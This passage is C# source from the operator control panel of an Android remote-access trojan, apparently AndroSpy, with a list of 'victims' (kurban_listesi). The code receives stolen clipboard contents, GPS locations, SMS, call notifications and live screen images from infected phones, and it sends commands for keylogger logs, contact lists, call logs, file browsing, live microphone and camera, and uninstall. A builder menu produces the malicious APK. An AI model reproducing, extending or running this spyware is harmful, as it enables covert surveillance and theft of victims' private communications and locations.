                        FindAyarlarById(soket2.Handle.ToString()).bilgileriIsle(Encoding.UTF8.GetString(dataBuff));

                        break;

                    case "<TELEFONBILGI>":
                        string[] spdata = Encoding.UTF8.GetString(dataBuff).Split(new string[] { "[VERI]" }, StringSplitOptions.None);
                        if (FindBilgiById(soket2.Handle.ToString()) == null)
                        {
                            Invoke((MethodInvoker)delegate
                            {
                                Bilgiler eglence = new Bilgiler(soket2, soket2.Handle.ToString());
                                eglence.Text = "Infos - " + krbnIsminiBul(soket2.Handle.ToString());
                                eglence.Show();
                            });
                        }
                        var shorted = FindBilgiById(soket2.Handle.ToString());
                        shorted.bilgileriIsle(spdata[1], spdata[2], spdata[3], spdata[6], spdata[5], spdata[7], spdata[8], spdata[9]);
                        break;

                    case "<PANOGELDI>":
                        try
                        {
                            if (FindTelephonFormById(soket2.Handle.ToString()) != null)
                            {
                                string icerik = Encoding.UTF8.GetString(dataBuff);
                                if (icerik != "[NULL]")
                                {
                                    FindTelephonFormById(soket2.Handle.ToString()).textBox4.Text = icerik;
                                }
                                else
                                {
                                    FindTelephonFormById(soket2.Handle.ToString()).textBox4.Text = string.Empty;
                                }
                            }
                        }
                        catch (Exception) { }
                        break;

                    case "<WALLPAPERBYTES>":
                        try
                        {
                            if (FindTelephonFormById(soket2.Handle.ToString()) != null)
                            {
                                FindTelephonFormById(soket2.Handle.ToString()).label4.Text = "Screen Resolution\n" + tag.Split('|')[2].Replace(">", "");
                                FindTelephonFormById(soket2.Handle.ToString()).pictureBox1.Image
                               = (Image)new ImageConverter().ConvertFrom(dataBuff);
                            }
                        }
                        catch (Exception) { }
                        break;

                    case "<LOCATION>":
                        if (FindKonumById(soket2.Handle.ToString()) == null)
                        {
                            Invoke((MethodInvoker)delegate
                            {
                                Konum knm = new Konum(soket2, soket2.Handle.ToString());
                                knm.Text = "Location - " + krbnIsminiBul(soket2.Handle.ToString());
                                knm.Show();
                            });
                        }
                        FindKonumById(soket2.Handle.ToString()).richTextBox1.Text = string.Empty;
                        string[] ayr = Encoding.UTF8.GetString(dataBuff).Split('=');
                        for (int i = 0; i < ayr.Length; i++)
                        {
                            if (ayr[i].Contains("{"))
                            {
                                string[] url = ayr[i].Split('{');
                                ayr[i] = $"http://maps.google.com/maps?q={url[0].Replace(','.ToString(), '.'.ToString())},{url[1].Replace(','.ToString(), '.'.ToString())}";
                            }
                            FindKonumById(soket2.Handle.ToString()).richTextBox1.Text += ayr[i] + Environment.NewLine;
                        }
                        break;

                    case "<ARAMA>":
                        if (Settings.dosyaYollari("notify_call") == "1")
                        {
                            try
                            {
                                DataGridViewRow lvi = dataGridView1.Rows.Cast<DataGridViewRow>().Where(items => items.Tag.ToString() ==
                                 soket2.Handle.ToString()).First();
                                Invoke((MethodInvoker)delegate
                                {
                                    string dt = Encoding.UTF8.GetString(dataBuff);
                                    var yeni = new YeniArama(dt.Split('=')[1], dt.Split('=')[0], krbnIsminiBul(soket2.Handle.ToString()), soket2.Handle.ToString());
                                    yeni.Text = "New Call - " + krbnIsminiBul(soket2.Handle.ToString());
                                    yeni.Show();
                                });
                            }
                            catch (Exception) { }
                        }
                        break;

                    case "<INDIRILDI>":
                        try
                        {
                            var window = FindDownloadManagerById(soket2.Handle.ToString());
                            if (window != null)
                            {
                                MessageBox.Show(window, Encoding.UTF8.GetString(dataBuff), "Status of Download", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            }
                            else
                            {
                                MessageBox.Show(Encoding.UTF8.GetString(dataBuff), "Status of Download", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            }
                        }
                        catch (Exception) { }
                        break;

                    case "<RECSMS>":
                        if (Settings.dosyaYollari("notify_sms") == "1")
                        {
                            string[] splsms = Encoding.UTF8.GetString(dataBuff).Split(new string[] { "[VERI]" }, StringSplitOptions.None);
                            Invoke((MethodInvoker)delegate
                            {
                                smsgeldi smsgeldi = new smsgeldi(splsms[1] + "/" + splsms[2], splsms[3], splsms[4]);
                                smsgeldi.Text = "New SMS! - " + krbnIsminiBul(soket2.Handle.ToString());
                                smsgeldi.Show();
                            });
                        }
                        break;

                    case "<WALLERROR>":
                        var _phone_ = FindTelephonFormById(soket2.Handle.ToString());
                        if (_phone_ != null)
                        {
                            MessageBox.Show(_phone_, Encoding.UTF8.GetString(dataBuff), "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        }
                        break;

                    case "<ERRORLIVESCREEN>":
                        var ek = FindLiveScreenById(soket2.Handle.ToString());
                        if (ek != null)
                        {
                            MessageBox.Show(ek, Encoding.UTF8.GetString(dataBuff), "Live Screen Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                        }
                        break;
                    case "<LIVESCREEN>":
                        if (receiveClasses.ContainsKey(soket2.Handle.ToString()))
                        {
                            var krbn_ = kurban_listesi.Where(x => x.identify == tag.Split('|')[2].Replace(">", "")).FirstOrDefault();
                            if (krbn_ != null)
                            {
                                var canliekran = FindLiveScreenById(krbn_.id);
                                if (canliekran != null)
                                {
                                    if (canliekran.button1.Enabled == false)
                                    {
                                        using (MemoryStream ms = new MemoryStream(StringCompressor.Decompress(dataBuff)))
                                        {
                                            using (Image sourceImg = Image.FromStream(ms))
                                            {
                                                Image clonedImg = new Bitmap(sourceImg.Width, sourceImg.Height, PixelFormat.Format32bppArgb);
                                                using (var copy = Graphics.FromImage(clonedImg))
                                                {
                                                    copy.DrawImage(sourceImg, 0, 0);
                                                }
                                                canliekran.pictureBox1.InitialImage = null;
                                                canliekran.pictureBox1.Image = clonedImg;
                                            }
                                        }
                                    }
                                    else { infClass.CloseSocks(); }
                                }
                                else
                                {
                                    try
                                    {
                                        byte[] senddata = MyDataPacker("SCREENLIVECLOSE", Encoding.UTF8.GetBytes("ECHO"));
                                        krbn_.soket.Send(senddata, 0, senddata.Length, SocketFlags.None);
                                    }
                                    catch (Exception) { }
                                    infClass.CloseSocks(); return;
                                }
                            }
                            else
                            {
                                infClass.CloseSocks(); return;
                            }
                        }
                        else { infClass.CloseSocks(); return; }
                        break;

                    case "<NOTSTART>":
                        var canliekran_ = FindLiveScreenById(soket2.Handle.ToString());
                        if (canliekran_ != null)
                        {
                            MessageBox.Show(canliekran_, "Victim has ignored the screen share dialog.", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            canliekran_.Close();
                        }
                        break;

                    case "<NOCAMERA>":
                        MessageBox.Show("The target device doesn't have any camera.", "No Camera", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        break;
                }
            }
            catch (Exception) { }
        }
        public static int topOf = 0;
        public async void Ekle(Socket socettte, string idimiz, string makine_ismi,
            string ulke_dil, string uretici_model, string android_ver, string wallpaper, string idenfication)
        {
            kurban_listesi.Add(new Kurbanlar(socettte, idimiz, idenfication));
            int rowId = dataGridView1.Rows.Add();
            DataGridViewRow row = dataGridView1.Rows[rowId];
            row.Cells["Column1"].Value = (wallpaper != "null") ? CemberResim((Image)new ImageConverter().ConvertFrom(Convert.FromBase64String(wallpaper))) : null;
            row.Cells["Column2"].Value = makine_ismi;
            row.Cells["Column3"].Value = socettte.RemoteEndPoint.ToString();
            row.Cells["Column4"].Value = ulke_dil;
            row.Cells["Column5"].Value = uretici_model.ToUpper();
            row.Cells["Column6"].Value = android_ver;

            row.Tag = idimiz;

            if (File.Exists(Environment.CurrentDirectory + "\\Store\\Flags\\" + ulke_dil.Split('/')[1].Replace("en", "england") + ".png"))
            {
                new Bildiri(makine_ismi, uretici_model, android_ver,
                Image.FromFile(Environment.CurrentDirectory + "\\Store\\Flags\\" + ulke_dil.Split('/')[1].Replace("en", "england") + ".png"), (Image)row.Cells["Column1"].Value).Show();
            }
            else
            {
                new Bildiri(makine_ismi, uretici_model, android_ver, Image.FromFile(Environment.CurrentDirectory + "\\Store\\Flags\\-1.png"), (Image)row.Cells["Column1"].Value).Show();
            }
            metroLabel2.Text = "Online: " + dataGridView1.Rows.Count.ToString();
            listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + socettte.Handle.ToString() +
                          " socket in list. => " + makine_ismi + "/" + socettte.RemoteEndPoint.ToString());
            await Task.Delay(1);
            topOf += 125;

        }
        public UploadProgress FindUploadProgressById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<UploadProgress>()
              .Where(form => string.Equals(form.Aydi, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public Yuzde FindYuzdeById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Yuzde>()
              .Where(form => string.Equals(form.dosyaAdi, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }

        public static Image CemberResim(Image img)
        {
            Bitmap bmp = new Bitmap(img.Width, img.Height);
            using (GraphicsPath gpImg = new GraphicsPath())
            {
                gpImg.AddEllipse(0, 0, img.Width, img.Height);
                using (Graphics grp = Graphics.FromImage(bmp))
                {
                    grp.Clear(Color.FromArgb(17, 17, 17));
                    grp.SetClip(gpImg);
                    grp.DrawImage(img, Point.Empty);
                }
            }
            return bmp;
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            foreach (Kurbanlar kurban in kurban_listesi)
            {
                kurban.soket.Close(); kurban.soket.Dispose();
            }
            Environment.Exit(0);
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            foreach (Kurbanlar krbn in kurban_listesi.ToList())
            {
                try
                {

                    byte[] kntrl = MyDataPacker("KNT", Encoding.Default.GetBytes("ECHO"));
                    krbn.soket.Send(kntrl, 0, kntrl.Length, SocketFlags.None);

                }
                catch (Exception ex)
                {
                    string handle = krbn.soket.Handle.ToString();
                    try
                    {
                        //kurban_listesi.Where(x => x.id == handle).First().soket.Close();
                        //kurban_listesi.Where(x => x.id == handle).First().soket.Dispose();
                        kurban_listesi.Remove(kurban_listesi.Where(x => x.id == handle).First());
                    }
                    catch (Exception) { }
                    
                    try { receiveClasses[handle].CloseSocks(); } catch (Exception) { }

                    try
                    {
                        DataGridViewRow victim = dataGridView1.Rows.Cast<DataGridViewRow>().Where(y => y.Tag.ToString() == handle).First();
                        listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + handle + " connection of this socket has closed. => " + victim.Cells[1].Value.ToString() + "/" + victim.Cells[2].Value.ToString() + " => " + ex.Message);
                        dataGridView1.Rows.Remove(victim);
                        metroLabel2.Text = "Online: " + dataGridView1.SelectedRows.Count.ToString();
                    }
                    catch (Exception) { }
                }
            }
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            dataGridView1.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
        }
        /// <summary>
        /// Send any data to connected socket.
        /// </summary>
        /// <param name="tag">The tag name of message, example: IP, MSGBOX, FILES etc. Then make switch case block for this tags
        /// on server or client.</param>
        /// <param name="message">Data of your message; any byte array of your data; image, text, file etc.</param>
        /// <param name="extraInfos">Extra Infos like: file name, max size, directory name etc.</param>
        public static byte[] MyDataPacker(string tag, byte[] message, string extraInfos = "null")
        {
            //This byte packer coded by qH0sT' - 2021 - AndroSpy.
            using (MemoryStream ms = new MemoryStream())
            {
                ms.Write(System.Text.Encoding.UTF8.GetBytes($"<{tag}>|{message.Length}|{extraInfos}>"), 0, System.Text.Encoding.UTF8.GetBytes($"<{tag}>|{message.Length}|{extraInfos}>").Length);
                ms.Write(message, 0, message.Length);
                ms.Write(System.Text.Encoding.UTF8.GetBytes("<EOF>"), 0, System.Text.Encoding.UTF8.GetBytes("<EOF>").Length);

                ms.Write(System.Text.Encoding.UTF8.GetBytes("SUFFIX"), 0, System.Text.Encoding.UTF8.GetBytes("SUFFIX").Length);
                return ms.ToArray();
            }
        }

        private void clearToolStripMenuItem_Click(object sender, EventArgs e)
        {
            listBox1.Items.Clear();
        }

        private void liveCameraToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == dataGridView1.SelectedRows[0].Tag.ToString())
                    {
                        try
                        {
                            byte[] senddata = Form1.MyDataPacker("CAMHAZIRLA", Encoding.UTF8.GetBytes("ECHO"));
                            kurban.soket.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                        }
                        catch (Exception) { }
                    }
                }
            }
        }

        private void fileVoyagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == dataGridView1.SelectedRows[0].Tag.ToString())
                    {
                        try
                        {
                            byte[] senddata = MyDataPacker("DOSYA", Encoding.UTF8.GetBytes("ECHO"));
                            kurban.soket.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                        }
                        catch (Exception) { }
                    }
                }
            }
        }

        private void phoneToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == dataGridView1.SelectedRows[0].Tag.ToString())
                    {
                        Telefon tlf = new Telefon(kurban.soket, kurban.id);
                        tlf.Text = "Phone - " + krbnIsminiBul(kurban.soket.Handle.ToString());
                        tlf.Show();
                    }
                }
            }
        }

        private void liveMicrophoneToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == dataGridView1.SelectedRows[0].Tag.ToString())
                    {
                        Mikrofon masaustu = new Mikrofon(kurban.soket);
                        masaustu.Text = "Live Microphone - " + krbnIsminiBul(kurban.soket.Handle.ToString());
                        masaustu.Show();
                    }
                }
            }
        }

        private void locationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == dataGridView1.SelectedRows[0].Tag.ToString())
                    {
                        try
                        {
                            byte[] senddata = MyDataPacker("KONUM", Encoding.UTF8.GetBytes("ECHO"));
                            kurban.soket.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                        }
                        catch (Exception) { }
                    }
                }
            }
        }

        private void keyloggerToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == dataGridView1.SelectedRows[0].Tag.ToString())
                    {
                        try
                        {
                            byte[] senddata = MyDataPacker("LOGLARIHAZIRLA", Encoding.UTF8.GetBytes("ECHO"));
                            kurban.soket.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                        }
                        catch (Exception) { }
                    }
                }
            }
        }

        private void funPanelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == dataGridView1.SelectedRows[0].Tag.ToString())
                    {
                        Eglence eglence = new Eglence(kurban.soket, kurban.id);
                        eglence.Text = "Fun Panel - " + krbnIsminiBul(kurban.soket.Handle.ToString());
                        eglence.Show();
                    }
                }
            }
        }

        private void sMSManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == dataGridView1.SelectedRows[0].Tag.ToString())
                    {
                        try
                        {
                            byte[] senddata = MyDataPacker("GELENKUTUSU", Encoding.UTF8.GetBytes("ECHO"));
                            kurban.soket.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                        }
                        catch (Exception) { }
                    }
                }
            }
        }

        private void contactListToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == dataGridView1.SelectedRows[0].Tag.ToString())
                    {
                        try
                        {
                            byte[] senddata = MyDataPacker("REHBERIVER", Encoding.UTF8.GetBytes("ECHO"));
                            kurban.soket.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                        }
                        catch (Exception) { }
                    }
                }
            }
        }

        private void callLogsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == dataGridView1.SelectedRows[0].Tag.ToString())
                    {
                        try
                        {
                            byte[] senddata = MyDataPacker("CALLLOGS", Encoding.UTF8.GetBytes("ECHO"));
                            kurban.soket.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                        }
                        catch (Exception) { }
                    }
                }
            }
        }

        private void deviceSettingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == dataGridView1.SelectedRows[0].Tag.ToString())
                    {
                        try
                        {
                            byte[] senddata = MyDataPacker("VOLUMELEVELS", Encoding.UTF8.GetBytes("ECHO"));
                            kurban.soket.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                        }
                        catch (Exception) { }
                    }
                }
            }
        }

        private void ınstalledAppsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == dataGridView1.SelectedRows[0].Tag.ToString())
                    {
                        try
                        {
                            byte[] senddata = MyDataPacker("APPLICATIONS", Encoding.UTF8.GetBytes("ECHO"));
                            kurban.soket.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                        }
                        catch (Exception) { }
                    }
                }
            }
        }

        private void statusOfPhoneToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == dataGridView1.SelectedRows[0].Tag.ToString())
                    {
                        try
                        {
                            byte[] senddata = MyDataPacker("SARJ", Encoding.UTF8.GetBytes("ECHO"));
                            kurban.soket.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                        }
                        catch (Exception) { }
                    }
                }
            }
        }

        private void downloadManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == dataGridView1.SelectedRows[0].Tag.ToString())
                    {
                        DownloadManager dwn = new DownloadManager(kurban.soket, kurban.id);
                        dwn.Text = "Download Manager - " + krbnIsminiBul(kurban.soket.Handle.ToString());
                        dwn.Show();
                    }
                }
            }
        }

        private void liveScreenToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count == 1)
            {
                if (int.Parse(dataGridView1.SelectedRows[0].Cells[5].Value.ToString().Split('/')[1]) >= 21)
                {
                    foreach (Kurbanlar kurban in kurban_listesi)
                    {
                        if (kurban.id == dataGridView1.SelectedRows[0].Tag.ToString())
                        {
                            livescreen lvsc = new livescreen(kurban.soket, kurban.id);
                            lvsc.Text = "Live Screen - " + krbnIsminiBul(kurban.soket.Handle.ToString());
                            lvsc.Show();
                        }
                    }
                }
                else
                {
                    MessageBox.Show("Target device's API Level must be 21 or higher.\nCheck link\nhttps://developer.android.com/reference/android/media/projection/MediaProjection", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    System.Diagnostics.Process.Start("https://developer.android.com/reference/android/media/projection/MediaProjection");
                }
            }
        }

        private void connectionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == dataGridView1.SelectedRows[0].Tag.ToString())
                    {
                        new Baglanti(kurban.soket, kurban.id).Show();
                    }
                }
            }
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi.ToList())
                {
                    if (kurban.id == dataGridView1.SelectedRows[0].Tag.ToString())
                    {
                        receiveClasses[kurban.id].CloseSocks();
                        listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + kurban.soket.Handle.ToString() +
                    " victim has restarted.");
                    }
                }
            }
        }

        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count == 1)
            {
                if (MessageBox.Show("Are you sure??", "Warning - Connection will be closed", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                {
                    foreach (Kurbanlar kurban in kurban_listesi)
                    {
                        if (kurban.id == dataGridView1.SelectedRows[0].Tag.ToString())
                        {
                            try
                            {
                                byte[] senddata = MyDataPacker("CONCLOSE", Encoding.UTF8.GetBytes("ECHO"));
                                kurban.soket.Send(senddata, 0, senddata.Length, SocketFlags.None);
                            }
                            catch (Exception) { }

                            receiveClasses[kurban.id].CloseSocks();
                            listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + kurban.soket.Handle.ToString() +
                        " victim has been closed by Controller.");
                        }
                    }
                }
            }
        }

        private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count == 1)
            {
                if (MessageBox.Show("Are you sure??", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                {
                    foreach (Kurbanlar kurban in kurban_listesi)
                    {
                        if (kurban.id == dataGridView1.SelectedRows[0].Tag.ToString())
                        {
                            try
                            {
                                byte[] senddata = MyDataPacker("UNINSTALL", Encoding.UTF8.GetBytes("ECHO"));
                                kurban.soket.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                            }
                            catch (Exception) { }
                        }
                    }
                }
            }
        }

        private void clearToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            listBox1.Items.Clear();
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            string msb = Settings.dosyaYollari("msbuild");
            string zipal = Settings.dosyaYollari("zip");
            string jars = Settings.dosyaYollari("jarsigner");
            if (msb == "..." || zipal == "..." || jars == "...")
            {
                MessageBox.Show(this, "Please select a path of Msbuild,Jarsigner,Zipalign in Settings", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                new Settings().Show();
            }
            else { new Builder().Show(); }
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Hakkinda().Show();
        }

        private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Settings().Show();
        }

        private void exitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void logsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            panel1.Visible = !panel1.Visible;
            if (panel1.Visible) { logsToolStripMenuItem.Text = "Victims"; }
            else { logsToolStripMenuItem.Text = "Logs"; }
        }
    }
}
/*
 * //byte[] dataByte = new byte[blockSize];
 * //int thisRead = 0;
                while (true)
                {
                    try
                    {
                        thisRead = await networkStream.ReadAsync(dataByte, 0, blockSize);
                        sb.Append(Encoding.UTF8.GetString(dataByte, 0, thisRead));
                        processBytes(sckInf, sb);
                        /*
                        while (sb.ToString().Trim().Contains($"<EOF{PASSWORD}>"))
                        {

                        BEGİN READ...

                            string veri = sb.ToString().Substring(sb.ToString().IndexOf("[0x09]"), sb.ToString().IndexOf($"<EOF{PASSWORD}>") + $"<EOF{PASSWORD}>".Length);
                            DataInvoke(sckInf, veri.Replace($"<EOF{PASSWORD}>", ""));
                            sb.Remove(sb.ToString().IndexOf("[0x09]"), sb.ToString().IndexOf($"<EOF{PASSWORD}>") + $"<EOF{PASSWORD}>".Length);
                        }
                    }
                    catch (Exception)
                    {
                        break;
                    }
                }
               */